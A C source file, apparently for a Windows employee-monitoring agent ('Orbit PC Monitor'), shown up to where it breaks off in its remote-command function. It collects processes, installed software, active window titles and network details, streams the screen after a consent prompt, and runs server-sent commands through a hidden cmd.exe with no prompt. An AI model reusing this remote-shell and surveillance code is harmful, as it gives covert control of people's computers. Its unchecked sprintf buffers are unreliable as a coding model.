#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <windows.h>
#include <wininet.h>
#include <winreg.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#include <shlobj.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <stdarg.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "shell32.lib")

#define AGENT_VERSION "4.0.0-browser-discord"
#define DEFAULT_SERVER "https://orbitmonitor-55tgpgdh.manus.space"
#define ENROLLMENT_TOKEN "orbit-demo-enrollment-2026"

static char g_server_url[512] = DEFAULT_SERVER;
static char g_agent_id[64]    = "DESKTOP-AGENT-01";
static char g_hostname[256]   = "DESKTOP-TEST";
static char g_username[256]   = "Employee";
static volatile BOOL g_running               = TRUE;
static volatile BOOL g_has_reported_heartbeat = FALSE;
static int g_screen_quality = 1;

/* =========================================================================
   Logging
   ========================================================================= */
void LogMessage(const char* format, ...) {
    char temp_path[MAX_PATH] = {0};
    DWORD path_len = GetTempPathA(sizeof(temp_path) - 1, temp_path);
    if (path_len == 0 || path_len >= sizeof(temp_path) - 32) return;
    strcat(temp_path, "OrbitPCMonitor.log");
    FILE* log = fopen(temp_path, "a");
    if (!log) return;
    time_t now = time(NULL);
    struct tm* t = localtime(&now);
    if (t) fprintf(log, "[%04d-%02d-%02d %02d:%02d:%02d] ",
        t->tm_year+1900, t->tm_mon+1, t->tm_mday, t->tm_hour, t->tm_min, t->tm_sec);
    va_list args;
    va_start(args, format);
    vfprintf(log, format, args);
    va_end(args);
    fprintf(log, "\n");
    fclose(log);
}

/* =========================================================================
   JSON string escaping helper
   ========================================================================= */
static void JsonEscapeAppend(char* out, size_t outSize, const char* in) {
    size_t pos = strlen(out);
    for (const char* p = in; *p && pos < outSize - 2; p++) {
        if (*p == '"' || *p == '\\') {
            if (pos + 2 >= outSize - 1) break;
            out[pos++] = '\\';
            out[pos++] = *p;
        } else if ((unsigned char)*p < 0x20) {
            /* skip control chars */
        } else {
            out[pos++] = *p;
        }
    }
    out[pos] = '\0';
}

/* =========================================================================
   HTTP helpers (WinINet)
   ========================================================================= */

/* Open a connection to parsed host/port/scheme */
static HINTERNET OpenHttpRequest(HINTERNET hInternet,
    const char* full_url, const char* method,
    HINTERNET* phConnect)
{
    char host[256] = {0};
    char path[1024] = {0};
    URL_COMPONENTSA urlComp = {0};
    urlComp.dwStructSize        = sizeof(urlComp);
    urlComp.lpszHostName        = host;
    urlComp.dwHostNameLength    = sizeof(host);
    urlComp.lpszUrlPath         = path;
    urlComp.dwUrlPathLength     = sizeof(path);
    if (!InternetCrackUrlA(full_url, 0, 0, &urlComp)) return NULL;

    INTERNET_PORT port = urlComp.nPort
        ? urlComp.nPort
        : (urlComp.nScheme == INTERNET_SCHEME_HTTPS
            ? INTERNET_DEFAULT_HTTPS_PORT : 80);
    DWORD flags = (urlComp.nScheme == INTERNET_SCHEME_HTTPS)
        ? (INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE)
        : (INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE);

    *phConnect = InternetConnectA(hInternet, host, port, NULL, NULL,
                                  INTERNET_SERVICE_HTTP, 0, 0);
    if (!*phConnect) return NULL;
    HINTERNET hReq = HttpOpenRequestA(*phConnect, method, path, NULL, NULL, NULL, flags, 0);
    if (!hReq) { InternetCloseHandle(*phConnect); *phConnect = NULL; }
    return hReq;
}

static void ReadResponse(HINTERNET hReq, char* out_buf, DWORD out_size) {
    if (!out_buf || !out_size) return;
    DWORD bytesRead = 0;
    InternetReadFile(hReq, out_buf, out_size - 1, &bytesRead);
    out_buf[bytesRead] = '\0';
}

BOOL HttpPostJson(const char* full_url, const char* json_data,
                  const char* token, const char* session_id,
                  char* out_buf, DWORD out_buf_size)
{
    HINTERNET hInternet = InternetOpenA("OrbitMonitorAgent/3.0",
        INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) return FALSE;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = OpenHttpRequest(hInternet, full_url, "POST", &hConnect);
    if (!hRequest) { InternetCloseHandle(hInternet); return FALSE; }

    char headers[1024];
    sprintf(headers, "Content-Type: application/json\r\nx-orbit-agent-token: %s\r\n", token);
    if (session_id && strlen(session_id) > 0) {
        char sess_hdr[128];
        sprintf(sess_hdr, "x-orbit-session: %s\r\n", session_id);
        strcat(headers, sess_hdr);
    }

    BOOL res = HttpSendRequestA(hRequest, headers, (DWORD)strlen(headers),
        (LPVOID)json_data, (DWORD)strlen(json_data));
    if (res) ReadResponse(hRequest, out_buf, out_buf_size);

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return res;
}

BOOL HttpGet(const char* full_url, const char* token,
             char* out_buf, DWORD out_buf_size)
{
    HINTERNET hInternet = InternetOpenA("OrbitMonitorAgent/3.0",
        INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) return FALSE;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = OpenHttpRequest(hInternet, full_url, "GET", &hConnect);
    if (!hRequest) { InternetCloseHandle(hInternet); return FALSE; }

    char headers[512];
    sprintf(headers, "x-orbit-agent-token: %s\r\n", token);
    BOOL res = HttpSendRequestA(hRequest, headers, (DWORD)strlen(headers), NULL, 0);
    if (res) ReadResponse(hRequest, out_buf, out_buf_size);

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return res;
}

/* POST raw binary data with a custom Content-Type */
BOOL HttpPostRaw(const char* full_url, const void* data, DWORD data_len,
                 const char* content_type, const char* token,
                 const char* extra_header_name, const char* extra_header_value,
                 char* out_buf, DWORD out_buf_size)
{
    HINTERNET hInternet = InternetOpenA("OrbitMonitorAgent/3.0",
        INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) return FALSE;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = OpenHttpRequest(hInternet, full_url, "POST", &hConnect);
    if (!hRequest) { InternetCloseHandle(hInternet); return FALSE; }

    char headers[512];
    int hlen = sprintf(headers,
        "Content-Type: %s\r\nx-orbit-agent-token: %s\r\n",
        content_type, token);
    if (extra_header_name && extra_header_value) {
        hlen += sprintf(headers + hlen, "%s: %s\r\n",
            extra_header_name, extra_header_value);
    }

    BOOL res = HttpSendRequestA(hRequest, headers, (DWORD)strlen(headers),
        (LPVOID)data, data_len);
    if (res) ReadResponse(hRequest, out_buf, out_buf_size);

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return res;
}

/* Backwards-compat wrapper for screen frames */
BOOL HttpPostFrame(const char* full_url, const void* frame_data, DWORD frame_len,
                   const char* token, const char* session_id)
{
    char hdr_val[128];
    sprintf(hdr_val, "%s", session_id);
    return HttpPostRaw(full_url, frame_data, frame_len, "image/bmp", token,
        "x-orbit-session", hdr_val, NULL, 0);
}

/* =========================================================================
   Screen capture
   ========================================================================= */
BYTE* CaptureScreenBMP(DWORD* out_len, int quality) {
    int srcW = GetSystemMetrics(SM_CXSCREEN);
    int srcH = GetSystemMetrics(SM_CYSCREEN);
    int scale = quality <= 0 ? 50 : quality >= 2 ? 100 : 75;
    int w = (srcW * scale) / 100;
    int h = (srcH * scale) / 100;
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem    = CreateCompatibleDC(hdcScreen);
    HBITMAP hbm   = CreateCompatibleBitmap(hdcScreen, w, h);
    HGDIOBJ hOld  = SelectObject(hdcMem, hbm);

    SetStretchBltMode(hdcMem, COLORONCOLOR);
    StretchBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, srcW, srcH, SRCCOPY);

    BITMAPINFOHEADER bi = {0};
    bi.biSize      = sizeof(BITMAPINFOHEADER);
    bi.biWidth     = w;
    bi.biHeight    = h;
    bi.biPlanes    = 1;
    bi.biBitCount  = 24;
    bi.biCompression = BI_RGB;

    DWORD rowBytes  = ((w * 3 + 3) & ~3);
    DWORD imageSize = rowBytes * h;
    DWORD totalSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + imageSize;

    BYTE* pBuf = (BYTE*)malloc(totalSize);
    if (!pBuf) {
        SelectObject(hdcMem, hOld); DeleteObject(hbm);
        DeleteDC(hdcMem); ReleaseDC(NULL, hdcScreen);
        return NULL;
    }

    BITMAPFILEHEADER* bfh = (BITMAPFILEHEADER*)pBuf;
    bfh->bfType     = 0x4D42;
    bfh->bfSize     = totalSize;
    bfh->bfReserved1 = 0; bfh->bfReserved2 = 0;
    bfh->bfOffBits  = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    memcpy(pBuf + sizeof(BITMAPFILEHEADER), &bi, sizeof(BITMAPINFOHEADER));
    GetDIBits(hdcMem, hbm, 0, h, pBuf + bfh->bfOffBits, (BITMAPINFO*)&bi, DIB_RGB_COLORS);

    SelectObject(hdcMem, hOld); DeleteObject(hbm);
    DeleteDC(hdcMem); ReleaseDC(NULL, hdcScreen);

    *out_len = totalSize;
    return pBuf;
}

/* =========================================================================
   Registry helpers
   ========================================================================= */
void ReadRegistryText(const char* subkey, const char* valueName,
                      char* out, DWORD outSize)
{
    out[0] = '\0';
    HKEY key = NULL;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, subkey, 0,
                      KEY_READ | KEY_WOW64_64KEY, &key) == ERROR_SUCCESS) {
        DWORD type = REG_SZ, size = outSize;
        RegQueryValueExA(key, valueName, NULL, &type, (LPBYTE)out, &size);
        RegCloseKey(key);
    }
}

/* =========================================================================
   Browser inventory
   ========================================================================= */
static void AppendBrowser(char* json, size_t jsonSize,
                           const char* name, const char* subkey,
                           const char* valueName)
{
    char version[128];
    ReadRegistryText(subkey, valueName, version, sizeof(version));
    if (!version[0]) return;
    if (strlen(json) > 1) strncat(json, ",", jsonSize - strlen(json) - 1);
    char entry[256];
    sprintf(entry, "{\"name\":\"%s\",\"version\":\"%s\"}", name, version);
    strncat(json, entry, jsonSize - strlen(json) - 1);
}

void GetBrowserInventory(char* out, size_t outSize) {
    strncpy(out, "[", outSize - 1);
    out[outSize - 1] = '\0';
    AppendBrowser(out, outSize, "Google Chrome",
        "SOFTWARE\\Google\\Chrome\\BLBeacon", "version");
    AppendBrowser(out, outSize, "Microsoft Edge",
        "SOFTWARE\\Microsoft\\EdgeUpdate\\Clients\\{56EB18F8-B008-4CBD-B6D2-8C97FE7E9062}", "pv");
    AppendBrowser(out, outSize, "Mozilla Firefox",
        "SOFTWARE\\Mozilla\\Mozilla Firefox", "CurrentVersion");
    AppendBrowser(out, outSize, "Brave",
        "SOFTWARE\\BraveSoftware\\Update\\Clients", "pv");
    strncat(out, "]", outSize - strlen(out) - 1);
}

/* =========================================================================
   Local IP
   ========================================================================= */
void GetLocalIp(char* out, size_t outSize) {
    strncpy(out, "unknown", outSize - 1);
    out[outSize - 1] = '\0';
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return;
    char hostname[256] = {0};
    if (gethostname(hostname, sizeof(hostname)) == 0) {
        struct addrinfo hints = {0};
        hints.ai_family = AF_INET;
        struct addrinfo* result = NULL;
        if (getaddrinfo(hostname, NULL, &hints, &result) == 0 && result) {
            struct sockaddr_in* addr = (struct sockaddr_in*)result->ai_addr;
            inet_ntop(AF_INET, &addr->sin_addr, out, (DWORD)outSize);
            freeaddrinfo(result);
        }
    }
    WSACleanup();
}

/* =========================================================================
   NEW: Running process list  (feature 1)
   Returns a JSON array of { pid, name } objects, capped at 256 entries.
   ========================================================================= */
void GetProcessList(char* out, size_t outSize) {
    strncpy(out, "[", outSize - 1);
    out[outSize - 1] = '\0';

    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) {
        strncat(out, "]", outSize - strlen(out) - 1);
        return;
    }

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    int count = 0;
    BOOL ok = Process32First(hSnap, &pe);
    while (ok && count < 256) {
        /* Build entry: {"pid":NNN,"name":"..."} */
        char entry[512];
        char escaped[256] = {0};
        /* Escape the process name */
        strncat(escaped, "", 1); /* ensure null */
        JsonEscapeAppend(escaped, sizeof(escaped), pe.szExeFile);

        sprintf(entry, "%s{\"pid\":%lu,\"name\":\"%s\"}",
            count > 0 ? "," : "", (unsigned long)pe.th32ProcessID, escaped);

        if (strlen(out) + strlen(entry) + 2 < outSize) {
            strncat(out, entry, outSize - strlen(out) - 1);
            count++;
        } else {
            break;
        }
        ok = Process32Next(hSnap, &pe);
    }
    CloseHandle(hSnap);
    strncat(out, "]", outSize - strlen(out) - 1);
}

/* =========================================================================
   NEW: Installed software inventory  (feature 2)
   Reads HKLM Uninstall keys from both 64-bit and 32-bit hives.
   Returns JSON array of { name, version, publisher } capped at 200 entries.
   ========================================================================= */
static int AppendSoftwareFromHive(char* out, size_t outSize,
                                   HKEY root, const char* subkey,
                                   REGSAM extraFlags, int already)
{
    HKEY hUninstall = NULL;
    if (RegOpenKeyExA(root, subkey, 0,
                      KEY_READ | KEY_ENUMERATE_SUB_KEYS | extraFlags,
                      &hUninstall) != ERROR_SUCCESS)
        return already;

    char appKeyName[256];
    DWORD index = 0;
    int count = already;

    while (count < 200) {
        DWORD nameSize = sizeof(appKeyName);
        if (RegEnumKeyExA(hUninstall, index++, appKeyName,
                          &nameSize, NULL, NULL, NULL, NULL) != ERROR_SUCCESS)
            break;

        HKEY hApp = NULL;
        if (RegOpenKeyExA(hUninstall, appKeyName, 0,
                          KEY_READ | extraFlags, &hApp) != ERROR_SUCCESS)
            continue;

        char dispName[256] = {0}, version[128] = {0}, publisher[256] = {0};
        DWORD sz;

        sz = sizeof(dispName);
        RegQueryValueExA(hApp, "DisplayName", NULL, NULL, (LPBYTE)dispName, &sz);
        sz = sizeof(version);
        RegQueryValueExA(hApp, "DisplayVersion", NULL, NULL, (LPBYTE)version, &sz);
        sz = sizeof(publisher);
        RegQueryValueExA(hApp, "Publisher", NULL, NULL, (LPBYTE)publisher, &sz);
        RegCloseKey(hApp);

        if (!dispName[0]) continue; /* skip empty entries */

        char eName[256] = {0}, eVer[128] = {0}, ePub[256] = {0};
        JsonEscapeAppend(eName, sizeof(eName), dispName);
        JsonEscapeAppend(eVer,  sizeof(eVer),  version);
        JsonEscapeAppend(ePub,  sizeof(ePub),  publisher);

        char entry[768];
        sprintf(entry, "%s{\"name\":\"%s\",\"version\":\"%s\",\"publisher\":\"%s\"}",
            (count > 0) ? "," : "", eName, eVer, ePub);

        if (strlen(out) + strlen(entry) + 2 < outSize) {
            strncat(out, entry, outSize - strlen(out) - 1);
            count++;
        } else {
            break;
        }
    }
    RegCloseKey(hUninstall);
    return count;
}

void GetSoftwareInventory(char* out, size_t outSize) {
    strncpy(out, "[", outSize - 1);
    out[outSize - 1] = '\0';

    int count = 0;
    count = AppendSoftwareFromHive(out, outSize,
        HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
        KEY_WOW64_64KEY, count);
    count = AppendSoftwareFromHive(out, outSize,
        HKEY_LOCAL_MACHINE,
        "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
        0, count);
    /* Current user software */
    count = AppendSoftwareFromHive(out, outSize,
        HKEY_CURRENT_USER,
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
        0, count);

    strncat(out, "]", outSize - strlen(out) - 1);
    (void)count;
}

/* =========================================================================
   NEW: Active window title  (feature 3)
   ========================================================================= */
void GetActiveWindowTitle(char* out, size_t outSize) {
    HWND hwnd = GetForegroundWindow();
    if (!hwnd) {
        strncpy(out, "", outSize - 1);
        return;
    }
    GetWindowTextA(hwnd, out, (int)outSize);
}

/* =========================================================================
   NEW: Network adapter list  (feature 5)
   Returns JSON array of { name, mac, ip, type } using GetAdaptersInfo.
   ========================================================================= */
void GetNetworkAdapters(char* out, size_t outSize) {
    strncpy(out, "[", outSize - 1);
    out[outSize - 1] = '\0';

    ULONG bufLen = 16 * 1024;
    PIP_ADAPTER_INFO pInfo = (PIP_ADAPTER_INFO)malloc(bufLen);
    if (!pInfo) { strncat(out, "]", outSize - strlen(out) - 1); return; }

    if (GetAdaptersInfo(pInfo, &bufLen) == ERROR_BUFFER_OVERFLOW) {
        free(pInfo);
        pInfo = (PIP_ADAPTER_INFO)malloc(bufLen);
        if (!pInfo) { strncat(out, "]", outSize - strlen(out) - 1); return; }
    }

    int count = 0;
    if (GetAdaptersInfo(pInfo, &bufLen) == NO_ERROR) {
        PIP_ADAPTER_INFO p = pInfo;
        while (p && count < 16) {
            /* Format MAC */
            char mac[32] = {0};
            if (p->AddressLength >= 6) {
                sprintf(mac, "%02X:%02X:%02X:%02X:%02X:%02X",
                    p->Address[0], p->Address[1], p->Address[2],
                    p->Address[3], p->Address[4], p->Address[5]);
            }

            /* Adapter type label */
            const char* typeStr = "Other";
            if      (p->Type == MIB_IF_TYPE_ETHERNET) typeStr = "Ethernet";
            else if (p->Type == MIB_IF_TYPE_LOOPBACK) typeStr = "Loopback";
            else if (p->Type == IF_TYPE_IEEE80211)     typeStr = "WiFi";
            else if (p->Type == MIB_IF_TYPE_PPP)       typeStr = "PPP";

            /* Escape adapter description */
            char eName[256] = {0};
            JsonEscapeAppend(eName, sizeof(eName), p->Description);

            char entry[512];
            sprintf(entry,
                "%s{\"name\":\"%s\",\"mac\":\"%s\","
                "\"ip\":\"%s\",\"type\":\"%s\"}",
                count > 0 ? "," : "",
                eName, mac,
                p->IpAddressList.IpAddress.String,
                typeStr);

            if (strlen(out) + strlen(entry) + 2 < outSize) {
                strncat(out, entry, outSize - strlen(out) - 1);
                count++;
            } else {
                break;
            }
            p = p->Next;
        }
    }
    free(pInfo);
    strncat(out, "]", outSize - strlen(out) - 1);
}

/* =========================================================================
   Heartbeat  (extended with new telemetry fields)
   ========================================================================= */
void SendHeartbeat() {
    char url[1024];
    sprintf(url, "%s/api/agent/heartbeat", g_server_url);

    /* --- Real CPU via NtQuerySystemInformation (PDH-free approach) ---
       We do two snapshots 500ms apart and compute delta. */
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    DWORD nCpus = si.dwNumberOfProcessors ? si.dwNumberOfProcessors : 1;

    /* Fallback: use GetSystemTimes */
    FILETIME idleA, kernA, userA, idleB, kernB, userB;
    GetSystemTimes(&idleA, &kernA, &userA);
    Sleep(400);
    GetSystemTimes(&idleB, &kernB, &userB);

    ULONGLONG idleDiff  = ((ULONGLONG)idleB.dwHighDateTime << 32 | idleB.dwLowDateTime)
                        - ((ULONGLONG)idleA.dwHighDateTime << 32 | idleA.dwLowDateTime);
    ULONGLONG kernDiff  = ((ULONGLONG)kernB.dwHighDateTime << 32 | kernB.dwLowDateTime)
                        - ((ULONGLONG)kernA.dwHighDateTime << 32 | kernA.dwLowDateTime);
    ULONGLONG userDiff  = ((ULONGLONG)userB.dwHighDateTime << 32 | userB.dwLowDateTime)
                        - ((ULONGLONG)userA.dwHighDateTime << 32 | userA.dwLowDateTime);
    ULONGLONG totalDiff = kernDiff + userDiff;
    int cpu = (totalDiff > 0)
        ? (int)(((totalDiff - idleDiff) * 100ULL) / totalDiff)
        : 0;
    if (cpu < 0) cpu = 0;
    if (cpu > 100) cpu = 100;

    /* --- Real memory via GlobalMemoryStatusEx --- */
    MEMORYSTATUSEX memStat;
    memStat.dwLength = sizeof(memStat);
    int mem = 0;
    if (GlobalMemoryStatusEx(&memStat)) {
        mem = (int)memStat.dwMemoryLoad;
    }

    /* --- Real disk usage (C:\ drive) --- */
    ULARGE_INTEGER freeBytesAvail, totalBytes, totalFreeBytes;
    int disk = 0;
    if (GetDiskFreeSpaceExA("C:\\", &freeBytesAvail, &totalBytes, &totalFreeBytes)) {
        if (totalBytes.QuadPart > 0) {
            disk = (int)(((totalBytes.QuadPart - totalFreeBytes.QuadPart) * 100ULL)
                / totalBytes.QuadPart);
        }
    }

    char model[256], serial[256], ip[64], browsers[2048];
    ReadRegistryText("HARDWARE\\DESCRIPTION\\System\\BIOS",
        "SystemProductName", model, sizeof(model));
    ReadRegistryText("HARDWARE\\DESCRIPTION\\System\\BIOS",
        "SystemSerialNumber", serial, sizeof(serial));
    GetLocalIp(ip, sizeof(ip));
    GetBrowserInventory(browsers, sizeof(browsers));
    if (!model[0]) strncpy(model, "Windows PC", sizeof(model) - 1);
    if (!serial[0]) strncpy(serial, "unknown", sizeof(serial) - 1);

    /* New telemetry */
    char processList[32768];
    GetProcessList(processList, sizeof(processList));

    char softwareInventory[65536];
    GetSoftwareInventory(softwareInventory, sizeof(softwareInventory));

    char activeWindow[512] = {0};
    GetActiveWindowTitle(activeWindow, sizeof(activeWindow));

    char networkAdapters[8192];
    GetNetworkAdapters(networkAdapters, sizeof(networkAdapters));

    /* Escape activeWindow for JSON */
    char escapedWindow[512] = {0};
    JsonEscapeAppend(escapedWindow, sizeof(escapedWindow), activeWindow);

    /* Build the JSON payload dynamically to accommodate large fields */
    /* We allocate on heap since process+software lists can be ~100 KB */
    size_t payloadSize = sizeof(processList) + sizeof(softwareInventory) + 4096;
    char* json = (char*)malloc(payloadSize);
    if (!json) return;

    snprintf(json, payloadSize,
        "{"
        "\"agentId\":\"%s\","
        "\"installToken\":\"%s\","
        "\"hostname\":\"%s\","
        "\"username\":\"%s\","
        "\"platform\":\"Windows 11 x64\","
        "\"osVersion\":\"Windows 11\","
        "\"hardwareModel\":\"%s\","
        "\"serialNumber\":\"%s\","
        "\"ipAddress\":\"%s\","
        "\"uptimeSeconds\":%llu,"
        "\"agentVersion\":\"%s\","
        "\"browserInventory\":%s,"
        "\"cpuPercent\":%d,"
        "\"memoryPercent\":%d,"
        "\"diskPercent\":%d,"
        "\"processList\":%s,"
        "\"softwareInventory\":%s,"
        "\"activeWindowTitle\":\"%s\","
        "\"networkAdapters\":%s"
        "}",
        g_agent_id, ENROLLMENT_TOKEN, g_hostname, g_username,
        model, serial, ip,
        GetTickCount64() / 1000ULL,
        AGENT_VERSION, browsers,
        cpu, mem, disk,
        processList, softwareInventory,
        escapedWindow, networkAdapters
    );

    char resp[1024] = {0};
    BOOL transport_ok = HttpPostJson(url, json, ENROLLMENT_TOKEN, NULL, resp, sizeof(resp));
    free(json);

    if (transport_ok && strstr(resp, "\"ok\":true")) {
        LogMessage("Heartbeat accepted; agentId=%s", g_agent_id);
        if (!g_has_reported_heartbeat) {
            g_has_reported_heartbeat = TRUE;
            MessageBoxA(NULL,
                "Orbit is connected to the company monitoring server.\n\n"
                "You can close this message; the agent will continue running in the background.",
                "Orbit PC Monitor - Connected", MB_OK | MB_ICONINFORMATION | MB_TOPMOST);
        }
    } else {
        LogMessage("Heartbeat failed; transport=%s; resp=%s",
            transport_ok ? "ok" : "failed", resp[0] ? resp : "<no response>");
        if (!g_has_reported_heartbeat) {
            g_has_reported_heartbeat = TRUE;
            char diagnostic[1024];
            if (!transport_ok) {
                sprintf(diagnostic,
                    "Orbit could not reach the monitoring server.\n\nServer: %s\n\n"
                    "Check that this PC has internet access.\n\n"
                    "A log was saved to %%TEMP%%\\OrbitPCMonitor.log.", g_server_url);
            } else {
                sprintf(diagnostic,
                    "Orbit reached the server, but the heartbeat was rejected.\n\n"
                    "Response: %s\n\nLog: %%TEMP%%\\OrbitPCMonitor.log.",
                    resp[0] ? resp : "<empty>");
            }
            MessageBoxA(NULL, diagnostic, "Orbit PC Monitor - Connection Problem",
                MB_OK | MB_ICONWARNING | MB_TOPMOST);
        }
    }
    if (transport_ok) {
        if (strstr(resp, "\"revoked\":true")) {
            MessageBoxA(NULL,
                "This PC's monitoring enrollment has been revoked. The agent will now exit.",
                "Orbit PC Monitor - Revoked", MB_OK | MB_ICONINFORMATION);
            g_running = FALSE;
        }
    }
}

/* =========================================================================
   Screen sharing (unchanged logic, uses new HttpPostFrame wrapper)
   ========================================================================= */
void CheckScreenSharingRequests() {
    char url[1024];
    sprintf(url, "%s/api/agent/screen/pending?agentId=%s", g_server_url, g_agent_id);

    char resp[1024] = {0};
    if (!HttpGet(url, ENROLLMENT_TOKEN, resp, sizeof(resp))) return;

    if (!strstr(resp, "\"sessionId\":\"")) return;

    char* p = strstr(resp, "\"sessionId\":\"") + 13;
    char session_id[64] = {0};
    int i = 0;
    while (*p && *p != '\"' && i < 63) session_id[i++] = *p++;
    session_id[i] = '\0';

    char prompt_msg[512];
    sprintf(prompt_msg,
        "Company IT Administrator requests live remote support and screen viewing.\n\n"
        "PC: %s\nUser: %s\nSession ID: %s\n\n"
        "Do you approve sharing your screen for this remote assistance session?",
        g_hostname, g_username, session_id);

    int choice = MessageBoxA(NULL, prompt_msg,
        "Orbit Remote Support - Screen Share Request",
        MB_YESNO | MB_ICONQUESTION | MB_TOPMOST);
    BOOL approved = (choice == IDYES);

    char dec_url[1024];
    sprintf(dec_url, "%s/api/agent/screen/decision", g_server_url);
    char dec_json[128];
    sprintf(dec_json, "{\"approved\":%s}", approved ? "true" : "false");
    HttpPostJson(dec_url, dec_json, ENROLLMENT_TOKEN, session_id, NULL, 0);

    if (!approved) return;

    char frame_url[1024], state_url[1024];
    sprintf(frame_url, "%s/api/agent/screen/frame", g_server_url);
    sprintf(state_url, "%s/api/agent/screen/state?sessionId=%s",
        g_server_url, session_id);

    int frames_sent = 0;
    while (g_running && frames_sent < 3600) {
        char st_resp[256] = {0};
        if (HttpGet(state_url, ENROLLMENT_TOKEN, st_resp, sizeof(st_resp))) {
            if (strstr(st_resp, "\"ended\"")) break;
            if      (strstr(st_resp, "\"quality\":\"low\""))  g_screen_quality = 0;
            else if (strstr(st_resp, "\"quality\":\"high\"")) g_screen_quality = 2;
            else                                               g_screen_quality = 1;
        }
        DWORD frame_len = 0;
        BYTE* pBmp = CaptureScreenBMP(&frame_len, g_screen_quality);
        if (pBmp) {
            HttpPostFrame(frame_url, pBmp, frame_len, ENROLLMENT_TOKEN, session_id);
            free(pBmp);
            frames_sent++;
        }
        Sleep(1000);
    }
}

/* =========================================================================
   NEW: Remote command execution  (feature 6)
   Agent polls /api/agent/command/pending, runs via cmd.exe, posts result.
   ========================================================================= */
void CheckRemoteCommands() {
    char url[1024];
    sprintf(url, "%s/api/agent/command/pending?agentId=%s", g_server_url, g_agent_id);

    char resp[2048] = {0};
    if (!HttpGet(url, ENROLLMENT_TOKEN, resp, sizeof(resp))) return;

    /* Look for "id" and "command" in the response */
    if (!strstr(resp, "\"id\":\"")) return;

    /* Parse command id */
    char* idStart = strstr(resp, "\"id\":\"");
    if (!idStart) return;
    idStart += 6;
    char cmd_id[32] = {0};
    int ci = 0;
    while (*idStart && *idStart != '\"' && ci < 31) cmd_id[ci++] = *idStart++;

    /* Parse command string */
    char* cmdStart = strstr(resp, "\"command\":\"");
    if (!cmdStart) return;
    cmdStart += 11;
    char command[2048] = {0};
    ci = 0;
    /* Simple JSON string unescape: handle \" and \\ */
    while (*cmdStart && ci < (int)sizeof(command) - 1) {
        if (*cmdStart == '\"') break;
        if (*cmdStart == '\\' && *(cmdStart+1)) {
            cmdStart++;
            if (*cmdStart == '"')       command[ci++] = '"';
            else if (*cmdStart == '\\') command[ci++] = '\\';
            else if (*cmdStart == 'n')  command[ci++] = '\n';
            else if (*cmdStart == 'r')  command[ci++] = '\r';
            else if (*cmdStart == 't')  command[ci++] = '\t';
            else { command[ci++] = '\\'; command[ci++] = *cmdStart; }
        } else {
            command[ci++] = *cmdStart;
        }
        cmdStart++;
    }

    if (!cmd_id[0] || !command[0]) return;

    LogMessage("Running remote command [%s]: %s", cmd_id, command);

    /* Create temp files for stdout and stderr */
    char tmpDir[MAX_PATH] = {0};
    GetTempPathA(sizeof(tmpDir) - 1, tmpDir);

    char stdoutFile[MAX_PATH], stderrFile[MAX_PATH];
    sprintf(stdoutFile, "%sorbit_stdout_%s.tmp", tmpDir, cmd_id);
    sprintf(stderrFile, "%sorbit_stderr_%s.tmp", tmpDir, cmd_id);

    /* Build cmd.exe command line */
    char cmdLine[4096];
    sprintf(cmdLine, "cmd.exe /c \"%s\" > \"%s\" 2>\"%s\"",
        command, stdoutFile, stderrFile);

    STARTUPINFOA si = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi = {0};
    BOOL created = CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    int exitCode = -1;
    char stdout_data[32768] = {0};
    char stderr_data[4096]  = {0};

    if (created) {
        /* Wait up to 30 seconds */
        WaitForSingleObject(pi.hProcess, 30000);
        DWORD ec = 0;
        if (GetExitCodeProcess(pi.hProcess, &ec)) exitCode = (int)ec;
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        /* Read stdout */
        FILE* f = fopen(stdoutFile, "rb");
        if (f) {
            fread(stdout_data, 1, sizeof(stdout_data) - 1, f);
            fclose(f);
            DeleteFileA(stdoutFile);
        }
        /* Read stderr */
        f = fopen(stderrFile, "rb");
        if (f) {
            fread(stderr_data, 1, sizeof(stderr_data) - 1, f);
            fclose(f);
            DeleteFileA(stderrFile);
        }
    } else {
        DWORD err = GetLastError();
        sprintf(stderr_data, "CreateProcess failed: error %lu", (unsigned long)err);
    }

